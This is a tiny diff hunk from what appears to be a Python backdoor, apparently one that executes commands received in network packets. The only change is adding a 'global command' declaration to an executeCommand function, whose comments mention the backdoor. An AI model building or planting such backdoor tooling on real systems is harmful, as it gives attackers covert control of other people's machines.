@@ -100,6 +100,7 @@ def checkCommand(ip, proto, data, pacType):
 		executeCommand(ip[9])
 
 def executeCommand(srcAddress):
+	global command
 	# check if command is within the backdoor
 	# otherwise, exec it
 	# clear command at the end
